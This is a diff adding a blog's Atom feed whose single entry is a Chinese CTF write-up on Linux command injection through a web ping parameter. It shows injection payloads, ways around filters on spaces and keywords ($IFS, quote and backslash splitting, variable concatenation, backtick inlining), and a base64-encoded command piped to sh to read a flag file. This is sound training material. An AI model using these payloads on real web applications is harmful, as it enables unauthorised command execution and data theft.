@@ -1,0 +1,110 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://example.com</id>
+    <title>FanqieのBlog • Posts by &#34;命令执行&#34; tag</title>
+    <link href="http://example.com" />
+    <updated>2021-07-27T13:45:24.931Z</updated>
+    <category term="随笔" />
+    <category term="SSTI" />
+    <category term="反序列化" />
+    <category term="命令执行" />
+    <category term="http" />
+    <category term="代码审计" />
+    <category term="sql" />
+    <category term="SSRF" />
+    <category term="反序列化2" />
+    <category term="文件包含" />
+    <category term="upload" />
+    <category term="业余爱好" />
+    <category term="RCE" />
+    <category term="php" />
+    <category term="python" />
+    <category term="yeah" />
+    <entry>
+        <id>http://example.com/2021/07/27/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
+        <title>(ctfwp)网站中linux命令执行</title>
+        <link rel="alternate" href="http://example.com/2021/07/27/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+        <content type="html">&lt;p&gt;这类的题不算多，在这里稍微总结一下&lt;/p&gt;
+&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;gxyctf2019ping-ping-ping&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gxyctf2019ping-ping-ping&#34;&gt;#&lt;/a&gt; [GXYCTF2019]Ping Ping Ping&lt;/h1&gt;
+&lt;p&gt;第一次做这种题，有思路但缺少经验，所以没做出来，下面是 wp。&lt;/p&gt;
+&lt;p&gt;进去界面什么都没有，只有  /?ip=&lt;/p&gt;
+&lt;p&gt;查看源码无果，抓包无果，尝试输入 /?ip=1&lt;/p&gt;
+&lt;p&gt;有结果 根据提示：ping&lt;/p&gt;
+&lt;p&gt;考虑是 linux 命令，尝试查看目录  /?ip=1;ls&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/wk9qAWMTK8dtsyU.png&#34; alt=&#34;1.1.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
+&lt;p&gt;根据结果 cat flag.php，结果不让看，提示猜测应该是过滤了空格&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/bm2O53pIYcLjNzw.png&#34; alt=&#34;1.2.png&#34;&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
+&lt;p&gt;经过百度后，发现有以下几种绕过过滤空格的方式：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;${IFS} 替换&lt;/li&gt;
+&lt;li&gt;$IFS$1 替换&lt;/li&gt;
+&lt;li&gt;${IFS 替换&lt;/li&gt;
+&lt;li&gt;%20 替换&lt;/li&gt;
+&lt;li&gt;&amp;lt;和 &amp;lt;&amp;gt; 重定向符替换&lt;/li&gt;
+&lt;li&gt;%09 替换&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;尝试第一种不行，&lt;strong&gt;(这里我提前做了下 FUZZ 测试，就不放图了，因为我看大佬都没用)&lt;/strong&gt; 发现 {} 等等都被过滤了&lt;/p&gt;
+&lt;p&gt;于是用第二种&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/gxF3pWdyJhYZwlc.png&#34; alt=&#34;1.3.png&#34;&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
+&lt;p&gt;发现 flag 被过滤了，查阅资料后，发现两张方式最合适。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第一种最常规：&lt;/strong&gt;  命令执行拼接&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token class-name type-declaration&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1fla&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;原理就是 linux 命令的拼接，让 a=g，然后将 flag 换为 fla$a&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第二种最牛逼：&lt;/strong&gt;  内联绕过&lt;/p&gt;
+&lt;p&gt;内联，就是将反引号内命令的输出作为输入执行。&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token class-name type-declaration&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;token string backtick-quoted-string&#34;&gt;`ls`&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;ls 输出的内容直接被执行了&lt;/p&gt;
+&lt;p&gt;flag 如图：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/OYtxEreBvki36Vm.png&#34; alt=&#34;1.4.png&#34;&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;另外我还学到了一些其他的方法，可能本题不适用，但也很常见。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;单引号、双引号绕过&lt;/strong&gt;，本题被 ban 了&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ca&#34;t fl&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;ag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;反斜线绕过&lt;/strong&gt;，本题被 ban 了&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ca&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;t fl&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;ag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;$1、$2 等和 $@绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c&lt;span class=&#34;token variable&#34;&gt;$1at&lt;/span&gt; gh&lt;span class=&#34;token variable&#34;&gt;$@&lt;/span&gt;twf01.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;如果&lt;strong&gt; cat 被过滤&lt;/strong&gt;，可以用下边的方法进行绕过～～&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(1)more:一页一页的显示档案内容
+
+(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
+
+(3)head:查看头几行
+
+(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+
+(5)tail:查看尾几行
+
+(6)nl：显示的时候，顺便输出行号
+
+(7)od:以二进制的方式读取档案内容
+
+(8)vi:一种编辑器，这个也可以查看
+
+(9)vim:一种编辑器，这个也可以查看
+
+(10)sort:可以查看
+
+(11)uniq:可以查看
+
+(12)file -f:报错出具体内容
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;p&gt;本题还可以用&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;sh，bash 下编码&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo$IFS$1Y2F0IGZsYWcucGhw&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;base64$IFS$&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;d&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo&amp;quot;str&amp;quot; | base64 -d
+将base64编码的字符串str+换行 解码输出
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;|sh 是以 sh 运行，不是 bash。&lt;/p&gt;
+&lt;p&gt;具体参考下面这篇文章&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2VzbW8xOTg5L2FydGljbGUvZGV0YWlscy81MTA5MzQ4OQ==&#34;&gt;Linux base64 -- 用 base64 编解码&lt;/span&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;另外，常见的管道符还有 &lt;code&gt;||&lt;/code&gt;    &lt;code&gt; ;&lt;/code&gt;   如果做不出来可以尝试下其他的。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;有新题我会补两道&lt;/p&gt;
+&lt;p&gt;END&lt;/p&gt;
+</content>
+        <category term="命令执行" />
+        <updated>2021-07-27T13:45:24.931Z</updated>
+    </entry>
+</feed>
